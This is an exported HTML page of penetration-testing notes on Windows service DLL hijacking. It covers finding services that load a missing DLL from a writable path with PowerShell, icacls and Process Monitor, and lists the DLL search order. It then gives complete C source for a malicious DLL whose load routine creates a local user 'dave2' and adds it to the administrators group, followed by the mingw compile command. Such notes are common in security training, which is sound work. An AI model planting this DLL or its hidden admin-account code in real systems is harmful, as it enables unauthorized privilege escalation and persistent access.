<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>17- service dll hijacking</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>17- service dll hijacking</h1><br/><p><strong><h2>Requirement :</h2></strong><ul><li>dll not existent </li><li>path writable </li><li>Detection viaPowerup or via Process monitor filter </li></ul></p><p></p><p><a href="image.png"><img src="images/117-1.png" alt="images/117-1.png" /></a><ul><li> sc stop service</li><li> sc start service </li></ul></p><p><ul><li>procmon filters:<ul><li>CreateFile Operation </li><li>Result : Name not found</li><li>Path : writable </li></ul></li></ul></p><p></p><p><h2>Steps</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## find runing service (ps look also for tasks</span><br /><span style="color:#00117f;font-weight:400">Get-CimInstance</span> <span style="color:#ff9d00;font-weight:700">-</span>ClassName win32_service | <span style="color:#ff9d00;font-weight:700">Select</span> Name,State,PathName | <span style="color:#ff9d00;font-weight:700">Where-Object</span> {<span style="color:#0088ff;font-weight:400">$_</span>.State <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#333333;font-weight:400">&#39;Running&#39;</span>}<br />icacls .<span style="color:#ff9d00;font-weight:700">\</span>Documents<span style="color:#ff9d00;font-weight:700">\</span>BetaServ.exe<br /><span style="color:#0088ff;font-weight:400">## dll search directory</span><br /><span style="color:#333333;font-weight:400">1</span>. The directory from which the application loaded.<br /><span style="color:#333333;font-weight:400">2</span>. The system directory.<br /><span style="color:#333333;font-weight:400">3</span>. The <span style="color:#00117f;font-weight:400">16-bit</span> system directory.<br /><span style="color:#333333;font-weight:400">4</span>. The Windows directory.<br /><span style="color:#333333;font-weight:400">5</span>. The current directory.<br /><span style="color:#333333;font-weight:400">6</span>. The directories that are listed <span style="color:#ff9d00;font-weight:700">in</span> the PATH environment variable.<br /><br /><span style="color:#0088ff;font-weight:400">## find path  dirs </span><br /><span style="color:#0088ff;font-weight:400">$env</span><span style="color:#ff9d00;font-weight:700">:</span>path <br /><br /><span style="color:#0088ff;font-weight:400">## cross compile dll</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;windows.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">BOOL</span> APIENTRY DllMain(<br />HANDLE hModule,<span style="color:#ff9d00;font-weight:700">//</span> Handle to DLL module<br />DWORD ul_reason_for_call,<span style="color:#ff9d00;font-weight:700">//</span> Reason <span style="color:#ff9d00;font-weight:700">for</span> calling <span style="color:#ff9d00;font-weight:700">function</span><br />LPVOID lpReserved ) <span style="color:#ff9d00;font-weight:700">//</span> Reserved<br />{<br /><span style="color:#ff9d00;font-weight:700">switch</span> ( ul_reason_for_call )<br />{<br /><span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_ATTACH<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">//</span> A <span style="color:#ff9d00;font-weight:700">process</span> is loading the DLL.<br /><span style="color:#7f0044;font-weight:400">int</span> i;<br />i <span style="color:#ff9d00;font-weight:700">=</span> system (<span style="color:#3ad900;font-weight:400">&quot;net user dave2 password123! /add&quot;</span>);<br />i <span style="color:#ff9d00;font-weight:700">=</span> system (<span style="color:#3ad900;font-weight:400">&quot;net localgroup administrators dave2 /add&quot;</span>);<br /><span style="color:#ff9d00;font-weight:700">break</span>;<br /><span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_ATTACH<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">//</span> A <span style="color:#ff9d00;font-weight:700">process</span> is creating a new thread.<br /><span style="color:#ff9d00;font-weight:700">break</span>;<br /><span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_DETACH<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">//</span> A thread exits normally.<br /><span style="color:#ff9d00;font-weight:700">break</span>;<br /><span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_DETACH<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">//</span> A <span style="color:#ff9d00;font-weight:700">process</span> unloads the DLL.<br /><span style="color:#ff9d00;font-weight:700">break</span>;<br />}<br /><span style="color:#ff9d00;font-weight:700">return</span> TRUE;<br />}<br /><br /><span style="color:#0088ff;font-weight:400">### compile it </span><br /><br /><span style="color:#00117f;font-weight:400">x86_64-w64-mingw32-gcc</span> mydll.<span style="color:#ff9d00;font-weight:700">cpp</span> <span style="color:#ff9d00;font-weight:700">--</span>shared <span style="color:#ff9d00;font-weight:700">-</span>o myDLL.dll</pre></div></p></div>
</body>
</html>
